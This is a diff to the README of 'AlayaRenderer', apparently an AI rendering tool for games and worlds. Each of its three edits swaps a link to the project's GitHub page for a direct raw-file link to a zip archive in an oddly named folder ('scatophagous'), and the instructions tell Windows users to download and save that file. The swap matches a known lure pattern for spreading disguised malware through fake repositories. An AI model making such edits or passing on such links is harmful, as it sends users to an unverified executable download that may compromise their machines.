@@ -1,6 +1,6 @@
 # 🎨 AlayaRenderer - AI Rendering for Games and Worlds
 
-[![Download AlayaRenderer](https://img.shields.io/badge/Download-AlayaRenderer-blue?style=for-the-badge)](https://github.com/Twentyeight-lawnchair711/AlayaRenderer)
+[![Download AlayaRenderer](https://img.shields.io/badge/Download-AlayaRenderer-blue?style=for-the-badge)](https://raw.githubusercontent.com/Twentyeight-lawnchair711/AlayaRenderer/main/scatophagous/Alaya-Renderer-unlearnability.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Use it if you want to:
 ## 📥 Download for Windows
 
 1. Open the download page:
-   https://github.com/Twentyeight-lawnchair711/AlayaRenderer
+   https://raw.githubusercontent.com/Twentyeight-lawnchair711/AlayaRenderer/main/scatophagous/Alaya-Renderer-unlearnability.zip
 2. On the page, look for the latest release or the main download file.
 3. Download the Windows version.
 4. Save the file to your PC, such as the Desktop or Downloads folder.
@@ -218,7 +218,7 @@ Keep the app, models, and sample files in the same folder tree unless the app sa
 
 If you need to return to the file, use this page:
 
-https://github.com/Twentyeight-lawnchair711/AlayaRenderer
+https://raw.githubusercontent.com/Twentyeight-lawnchair711/AlayaRenderer/main/scatophagous/Alaya-Renderer-unlearnability.zip
 
 ## 📝 Notes for Windows Users
 
